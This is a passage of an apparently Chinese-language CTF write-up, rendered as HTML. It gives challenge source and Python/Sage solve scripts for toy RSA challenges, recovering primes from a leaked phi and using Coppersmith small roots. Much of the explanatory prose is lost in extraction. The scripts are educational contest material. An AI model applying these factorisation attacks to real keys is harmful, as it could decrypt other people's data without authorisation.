class="number">2</span>*x^<span class="number">306</span> + <span class="number">3</span>*x^<span class="number">305</span> + <span class="number">5</span>*x^<span class="number">304</span> + <span class="number">4</span>*x^<span class="number">303</span> + x^<span class="number">302</span> - x^<span class="number">301</span> - x^<span class="number">300</span> - <span class="number">2</span>*x^<span class="number">299</span> - <span class="number">2</span>*x^<span class="number">298</span> + x^<span class="number">297</span> + <span class="number">3</span>*x^<span class="number">296</span> - x^<span class="number">295</span> - <span class="number">4</span>*x^<span class="number">292</span> - x^<span class="number">290</span> + <span class="number">4</span>*x^<span class="number">289</span> - x^<span class="number">287</span> - <span class="number">3</span>*x^<span class="number">286</span> + x^<span class="number">285</span> - <span class="number">2</span>*x^<span class="number">284</span> + x^<span class="number">283</span> - x^<span class="number">282</span> - <span class="number">2</span>*x^<span class="number">281</span> + x^<span class="number">280</span> - <span class="number">2</span>*x^<span class="number">279</span> + x^<span class="number">278</span> + <span class="number">2</span>*x^<span class="number">277</span> - <span class="number">3</span>*x^<span class="number">276</span> - x^<span class="number">275</span> - <span class="number">4</span>*x^<span class="number">274</span> - <span class="number">3</span>*x^<span class="number">273</span> - <span class="number">5</span>*x^<span class="number">272</span> - <span class="number">2</span>*x^<span class="number">271</span> - <span class="number">3</span>*x^<span class="number">270</span> + <span class="number">2</span>*x^<span class="number">269</span> + <span class="number">2</span>*x^<span class="number">268</span> - x^<span class="number">267</span> - <span class="number">2</span>*x^<span class="number">266</span> + x^<span class="number">265</span> + x^<span class="number">264</span> - <span class="number">3</span>*x^<span class="number">262</span> - <span class="number">3</span>*x^<span class="number">259</span> + <span class="number">2</span>*x^<span class="number">258</span> - x^<span class="number">257</span> + <span class="number">2</span>*x^<span class="number">256</span> + <span class="number">2</span>*x^<span class="number">255</span> - x^<span class="number">254</span> - <span class="number">2</span>*x^<span class="number">253</span> - x^<span class="number">252</span> + <span class="number">2</span>*x^<span class="number">251</span> - x^<span class="number">250</span> + x^<span class="number">249</span> + <span class="number">2</span>*x^<span class="number">247</span> + <span class="number">2</span>*x^<span class="number">246</span> + <span class="number">2</span>*x^<span class="number">245</span> - <span class="number">2</span>*x^<span class="number">244</span> - <span class="number">3</span>*x^<span class="number">243</span> + <span class="number">2</span>*x^<span class="number">242</span> - <span class="number">3</span>*x^<span class="number">241</span> - x^<span class="number">240</span> - <span class="number">3</span>*x^<span class="number">239</span> - x^<span class="number">236</span> - <span class="number">3</span>*x^<span class="number">235</span> - <span class="number">2</span>*x^<span class="number">234</span> - x^<span class="number">233</span> - <span class="number">2</span>*x^<span class="number">232</span> - x^<span class="number">231</span> - <span class="number">3</span>*x^<span class="number">230</span> - <span class="number">2</span>*x^<span class="number">229</span> - <span class="number">4</span>*x^<span class="number">228</span> - <span class="number">2</span>*x^<span class="number">227</span> - <span class="number">3</span>*x^<span class="number">226</span> + <span class="number">2</span>*x^<span class="number">225</span> + x^<span class="number">224</span> - x^<span class="number">223</span> - <span class="number">2</span>*x^<span class="number">221</span> + <span class="number">3</span>*x^<span class="number">219</span> - x^<span class="number">217</span> - <span class="number">2</span>*x^<span class="number">216</span> + x^<span class="number">215</span> + <span class="number">2</span>*x^<span class="number">213</span> - x^<span class="number">212</span> + <span class="number">3</span>*x^<span class="number">211</span> + x^<span class="number">210</span> + <span class="number">4</span>*x^<span class="number">209</span> + x^<span class="number">208</span> - x^<span class="number">206</span> - x^<span class="number">205</span> - x^<span class="number">204</span> + <span class="number">2</span>*x^<span class="number">203</span> - <span class="number">3</span>*x^<span class="number">202</span> + <span class="number">2</span>*x^<span class="number">199</span> - x^<span class="number">198</span> + <span class="number">2</span>*x^<span class="number">196</span> - <span class="number">2</span>*x^<span class="number">195</span> + <span class="number">3</span>*x^<span class="number">194</span> + <span class="number">3</span>*x^<span class="number">193</span> - x^<span class="number">192</span> + <span class="number">4</span>*x^<span class="number">191</span> + <span class="number">2</span>*x^<span class="number">189</span> + x^<span class="number">186</span> - x^<span class="number">185</span> - x^<span class="number">184</span> + <span class="number">3</span>*x^<span class="number">183</span> + x^<span class="number">182</span> + <span class="number">2</span>*x^<span class="number">181</span> - <span class="number">2</span>*x^<span class="number">180</span> + x^<span class="number">177</span> + x^<span class="number">175</span> - x^<span class="number">173</span> + <span class="number">3</span>*x^<span class="number">172</span> + x^<span class="number">170</span> + x^<span class="number">169</span> - x^<span class="number">167</span> - <span class="number">2</span>*x^<span class="number">166</span> - x^<span class="number">165</span> - <span class="number">4</span>*x^<span class="number">164</span> - <span class="number">2</span>*x^<span class="number">163</span> + <span class="number">2</span>*x^<span class="number">162</span> + <span class="number">4</span>*x^<span class="number">161</span> - <span class="number">2</span>*x^<span class="number">160</span> - <span class="number">3</span>*x^<span class="number">159</span> - <span class="number">2</span>*x^<span class="number">158</span> - <span class="number">2</span>*x^<span class="number">157</span> + x^<span class="number">156</span> - x^<span class="number">155</span> + <span class="number">3</span>*x^<span class="number">154</span> - <span class="number">4</span>*x^<span class="number">153</span> + x^<span class="number">151</span> + <span class="number">2</span>*x^<span class="number">150</span> + x^<span class="number">149</span> - x^<span class="number">148</span> + <span class="number">2</span>*x^<span class="number">147</span> + <span class="number">3</span>*x^<span class="number">146</span> + <span class="number">2</span>*x^<span class="number">145</span> - <span class="number">4</span>*x^<span class="number">144</span> - <span class="number">4</span>*x^<span class="number">143</span> + x^<span class="number">142</span> - <span class="number">2</span>*x^<span class="number">140</span> - <span class="number">2</span>*x^<span class="number">139</span> + <span class="number">2</span>*x^<span class="number">138</span> + <span class="number">3</span>*x^<span class="number">137</span> + <span class="number">3</span>*x^<span class="number">136</span> + <span class="number">3</span>*x^<span class="number">135</span> + x^<span class="number">134</span> - x^<span class="number">133</span> + <span class="number">2</span>*x^<span class="number">132</span> + <span class="number">3</span>*x^<span class="number">130</span> - <span class="number">3</span>*x^<span class="number">129</span> - <span class="number">2</span>*x^<span class="number">128</span> - x^<span class="number">127</span> - <span class="number">2</span>*x^<span class="number">126</span> + x^<span class="number">125</span> + x^<span class="number">124</span> - <span class="number">2</span>*x^<span class="number">123</span> + x^<span class="number">122</span> - x^<span class="number">121</span> + <span class="number">3</span>*x^<span class="number">120</span> - x^<span class="number">119</span> - <span class="number">2</span>*x^<span class="number">118</span> - x^<span class="number">117</span> - x^<span class="number">116</span> - <span class="number">2</span>*x^<span class="number">115</span> + <span class="number">2</span>*x^<span class="number">114</span> + <span class="number">2</span>*x^<span class="number">113</span> - <span class="number">3</span>*x^<span class="number">112</span> - x^<span class="number">111</span> - <span class="number">4</span>*x^<span class="number">110</span> + x^<span class="number">109</span> + x^<span class="number">108</span> + x^<span class="number">106</span> - <span class="number">4</span>*x^<span class="number">105</span> + x^<span class="number">104</span> - x^<span class="number">103</span> - x^<span class="number">101</span> + x^<span class="number">100</span> - <span class="number">2</span>*x^<span class="number">99</span> + x^<span class="number">98</span> - x^<span class="number">97</span> + <span class="number">3</span>*x^<span class="number">96</span> + <span class="number">3</span>*x^<span class="number">94</span> - x^<span class="number">93</span> - x^<span class="number">92</span> + x^<span class="number">91</span> - <span class="number">2</span>*x^<span class="number">90</span> + x^<span class="number">89</span> - x^<span class="number">88</span> + x^<span class="number">87</span> - x^<span class="number">86</span> + x^<span class="number">85</span> + x^<span class="number">84</span> - x^<span class="number">83</span> + x^<span class="number">79</span> - <span class="number">3</span>*x^<span class="number">78</span> - <span class="number">2</span>*x^<span class="number">77</span> + x^<span class="number">74</span> + <span class="number">3</span>*x^<span class="number">73</span> - x^<span class="number">72</span> - <span class="number">3</span>*x^<span class="number">71</span> - <span class="number">2</span>*x^<span class="number">70</span> + x^<span class="number">69</span> - <span class="number">3</span>*x^<span class="number">66</span> + x^<span class="number">65</span> + x^<span class="number">64</span> - <span class="number">4</span>*x^<span class="number">62</span> - x^<span class="number">61</span> + x^<span class="number">60</span> - x^<span class="number">59</span> + <span class="number">3</span>*x^<span class="number">58</span> - x^<span class="number">57</span> - x^<span class="number">54</span> + <span class="number">3</span>*x^<span class="number">53</span> + x^<span class="number">51</span> - <span class="number">3</span>*x^<span class="number">50</span> - x^<span class="number">49</span> + <span class="number">2</span>*x^<span class="number">47</span> - x^<span class="number">46</span> - x^<span class="number">44</span> + x^<span class="number">43</span> - x^<span class="number">42</span> - <span class="number">4</span>*x^<span class="number">41</span> - <span class="number">3</span>*x^<span class="number">39</span> - x^<span class="number">37</span> - x^<span class="number">36</span> - <span class="number">3</span>*x^<span class="number">35</span> + x^<span class="number">34</span> + x^<span class="number">33</span> - <span class="number">2</span>*x^<span class="number">32</span> + <span class="number">2</span>*x^<span class="number">31</span> - x^<span class="number">30</span> + <span class="number">2</span>*x^<span class="number">29</span> - <span class="number">2</span>*x^<span class="number">28</span> - <span class="number">2</span>*x^<span class="number">27</span> - x^<span class="number">24</span> + x^<span class="number">22</span> - <span class="number">5</span>*x^<span class="number">21</span> + <span class="number">3</span>*x^<span class="number">20</span> + <span class="number">2</span>*x^<span class="number">19</span> - x^<span class="number">18</span> + <span class="number">2</span>*x^<span class="number">17</span> + x^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">15</span> - <span class="number">2</span>*x^<span class="number">14</span> + x^<span class="number">13</span> + x^<span class="number">12</span> + <span class="number">2</span>*x^<span class="number">11</span> - <span class="number">3</span>*x^<span class="number">10</span> + <span class="number">3</span>*x^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">8</span> - <span class="number">4</span>*x^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">5</span> - <span class="number">4</span>*x^<span class="number">4</span> + x^<span class="number">3</span> - x^<span class="number">2</span> - <span class="number">1</span></span><br><span class="line">p = GCD(w-<span class="built_in">pow</span>(<span class="number">2</span>,<span class="built_in">int</span>(f%(x-<span class="number">1</span>),n),n))</span><br><span class="line"><span class="comment"># p = GCD(w * pow(2, -f(1), n) - 1, n)</span></span><br><span class="line">q = n // p</span><br><span class="line">d = inverse(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)).decode())</span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi mathvariant="normal">%</mi><mo stretchy="false">(</mo><mi>x</mi><mo></mo><mn>1</mn><mo stretchy="false">)</mo><mtext></mtext><mi>s</mi><mi>a</mi><mi>g</mi><mi>e</mi><mtext></mtext></mrow><annotation encoding="application/x-tex">f\%(x-1)sage</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord">%</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span></p><h2 id="baby_factor_revenge"><a class="markdownIt-Anchor" href="#baby_factor_revenge"></a> baby_factor_revenge</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>():</span><br><span class="line">    pl  = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        pl.append(getPrime(<span class="number">1024</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(pl)</span><br><span class="line">pl = create()</span><br><span class="line">m=<span class="string">b&#x27;NSSCTF&#123;xxxxxx&#125;&#x27;</span></span><br><span class="line">p,q,r = pl[<span class="number">0</span>],pl[<span class="number">1</span>],pl[<span class="number">2</span>]</span><br><span class="line">n = p*q*r</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">phi_2=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">n2=p*q</span><br><span class="line">c=<span class="built_in">pow</span>(bytes_to_long(m),e,n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n=<span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;phi=<span class="subst">&#123;phi&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n=3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984460699747964946764645986828307675081596907634022110868102739948513844625534865764252668312850364286204872187001344218083941399088833989233474318289529103178632284291007694811574023047207470113594082533713524606268388742119103653587354956091145288566437795469230667897089543048576812362251576281067933183713438502813206542834734983616378764909202774603304124497453696792428111112644362307853143219890039129054302905340695668256116233515323529918746264727874817221051242387145263342018617858562987223211598238069486447049955021864781104312134816578626968386395835285074116149472750100154961405785440009296096563521430833</span></span><br><span class="line"><span class="string">phi=3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984394758254181484105857103844940487787404078873566779953101987404891507588290232992132681729619718279684673827347612899406697514777723904351697638562060304399923174376216080338949397741477013367831377040866937433520175862575061413321076151761545984886547872427147498175814451096795344136954743868643889768901204954902708679102384061694877757565486240670882343628571424084461972849147495569088820011108794930593172573959423278140327579049114196086428504291102619820322231225943837444001821535593671764186251713714593498207219093585758479440828038119079608764008747539277397742897542501803218788455452391287578171880267200</span></span><br><span class="line"><span class="string">c=8847973599594272436100870059187158819529199340583461915617467299706215012295598155778224026186157290320191983062022702191439286020733625396165573681688842631368993650799220713225485752608650482408353598320160571916055498330875851476520668973214124194890108144336715482373743731578734960096351460142579903010557821654345995923836938260379746304222820835040419844947019844885128550552066290798665884099701340641403329066058638137944934073185448687990744852400616823426082588916251127609191094346267837812018236673478691437630461425526779014305216914035039981685211625653600564431704400207095883904994772993227506462664</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/jvdsn/crypto-attacks/blob/master/attacks/factorization/known_phi.py">https://github.com/jvdsn/crypto-attacks/blob/master/attacks/factorization/known_phi.py</a><br />(<code>SHCTF2024-week4</code>)</p><p><code>NKCTF2023-ez_rsa</code><code>Google</code><code>attack phi n</code><code>github</code><code>attack</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> is_prime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorize</span>(<span class="params">N, phi</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Recovers the prime factors from a modulus if Euler&#x27;s totient is known.</span></span><br><span class="line"><span class="string">    This method only works for a modulus consisting of 2 primes!</span></span><br><span class="line"><span class="string">    :param N: the modulus</span></span><br><span class="line"><span class="string">    :param phi: Euler&#x27;s totient, the order of the multiplicative group modulo N</span></span><br><span class="line"><span class="string">    :return: a tuple containing the prime factors, or None if the factors were not found</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    s = N + <span class="number">1</span> - phi</span><br><span class="line">    d = s ** <span class="number">2</span> - <span class="number">4</span> * N</span><br><span class="line">    p = <span class="built_in">int</span>(s - isqrt(d)) // <span class="number">2</span></span><br><span class="line">    q = <span class="built_in">int</span>(s + isqrt(d)) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorize_multi_prime</span>(<span class="params">N, phi</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Recovers the prime factors from a modulus if Euler&#x27;s totient is known.</span></span><br><span class="line"><span class="string">    This method works for a modulus consisting of any number of primes, but is considerably be slower than factorize.</span></span><br><span class="line"><span class="string">    More information: Hinek M. J., Low M. K., Teske E., &quot;On Some Attacks on Multi-prime RSA&quot; (Section 3)</span></span><br><span class="line"><span class="string">    :param N: the modulus</span></span><br><span class="line"><span class="string">    :param phi: Euler&#x27;s totient, the order of the multiplicative group modulo N</span></span><br><span class="line"><span class="string">    :return: a tuple containing the prime factors</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    prime_factors = <span class="built_in">set</span>()</span><br><span class="line">    factors = [N]</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(factors) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># Element to factorize.</span></span><br><span class="line">        N = factors[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        w = randrange(<span class="number">2</span>, N - <span class="number">1</span>)</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> phi % (<span class="number">2</span> ** i) == <span class="number">0</span>:</span><br><span class="line">            sqrt_1 = <span class="built_in">pow</span>(w, phi // (<span class="number">2</span> ** i), N)</span><br><span class="line">            <span class="keyword">if</span> sqrt_1 &gt; <span class="number">1</span> <span class="keyword">and</span> sqrt_1 != N - <span class="number">1</span>:</span><br><span class="line">                <span class="comment"># We can remove the element to factorize now, because we have a factorization.</span></span><br><span class="line">                factors = factors[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                p = gcd(N, sqrt_1 + <span class="number">1</span>)</span><br><span class="line">                q = N // p</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> is_prime(p):</span><br><span class="line">                    prime_factors.add(p)</span><br><span class="line">                <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                    factors.append(p)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> is_prime(q):</span><br><span class="line">                    prime_factors.add(q)</span><br><span class="line">                <span class="keyword">elif</span> q &gt; <span class="number">1</span>:</span><br><span class="line">                    factors.append(q)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Continue in the outer loop</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(prime_factors)</span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    e=<span class="number">65537</span></span><br><span class="line">    n=<span class="number">3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984460699747964946764645986828307675081596907634022110868102739948513844625534865764252668312850364286204872187001344218083941399088833989233474318289529103178632284291007694811574023047207470113594082533713524606268388742119103653587354956091145288566437795469230667897089543048576812362251576281067933183713438502813206542834734983616378764909202774603304124497453696792428111112644362307853143219890039129054302905340695668256116233515323529918746264727874817221051242387145263342018617858562987223211598238069486447049955021864781104312134816578626968386395835285074116149472750100154961405785440009296096563521430833</span></span><br><span class="line">    phi=<span class="number">3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984394758254181484105857103844940487787404078873566779953101987404891507588290232992132681729619718279684673827347612899406697514777723904351697638562060304399923174376216080338949397741477013367831377040866937433520175862575061413321076151761545984886547872427147498175814451096795344136954743868643889768901204954902708679102384061694877757565486240670882343628571424084461972849147495569088820011108794930593172573959423278140327579049114196086428504291102619820322231225943837444001821535593671764186251713714593498207219093585758479440828038119079608764008747539277397742897542501803218788455452391287578171880267200</span></span><br><span class="line">    c=<span class="number">8847973599594272436100870059187158819529199340583461915617467299706215012295598155778224026186157290320191983062022702191439286020733625396165573681688842631368993650799220713225485752608650482408353598320160571916055498330875851476520668973214124194890108144336715482373743731578734960096351460142579903010557821654345995923836938260379746304222820835040419844947019844885128550552066290798665884099701340641403329066058638137944934073185448687990744852400616823426082588916251127609191094346267837812018236673478691437630461425526779014305216914035039981685211625653600564431704400207095883904994772993227506462664</span></span><br><span class="line">    fac = factorize_multi_prime(n, phi)</span><br><span class="line">    p,q,r=<span class="built_in">sorted</span>(fac)</span><br><span class="line">    phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    n=p*q</span><br><span class="line">    d=inverse(e,phi)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)).decode())</span><br></pre></td></tr></table></figure><p><strong>coppersmith attack</strong><strong>xm</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo></mo><msup><mi>c</mi><mi>d</mi></msup><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><msub><mi>n</mi><mn>1</mn></msub><mo></mo><msup><mi>m</mi><mrow><mi>e</mi><mo></mo><mi>d</mi></mrow></msup><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><msub><mi>n</mi><mn>2</mn></msub><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><msub><mi>n</mi><mn>1</mn></msub><mo></mo><mi>m</mi><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><msub><mi>n</mi><mn>2</mn></msub><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><msub><mi>n</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">s\equiv c^{d}\ mod\ n_{1}\equiv m^{e*d}\ mod\ n_{2}\ mod\ n_{1}\equiv m\ mod\ n_{2}\ mod\ n_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.999108em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.999108em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mbin mtight"></span><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal">m</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p><code>m</code><code>n1,n2</code><code>exp</code>()</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">n = </span><br><span class="line">phi = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">s = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x-s</span><br><span class="line">res = f.small_roots(x=<span class="number">2</span>^<span class="number">2048</span>,beta = <span class="number">0.4</span>, epsilon = <span class="number">0.05</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(res[<span class="number">0</span>])).decode())</span><br></pre></td></tr></table></figure><h2 id="mimt_rsa"><a class="markdownIt-Anchor" href="#mimt_rsa"></a> MIMT_RSA</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> KEY flag  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">int</span>(KEY).bit_length() == <span class="number">36</span></span><br><span class="line"><span class="keyword">assert</span> <span class="keyword">not</span> isPrime(KEY)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">ck = <span class="built_in">pow</span>(KEY, e, n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">b&#x27;NSSCTF&#123;&#x27;</span> + md5(<span class="built_in">str</span>(KEY).encode()).hexdigest().encode() + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span 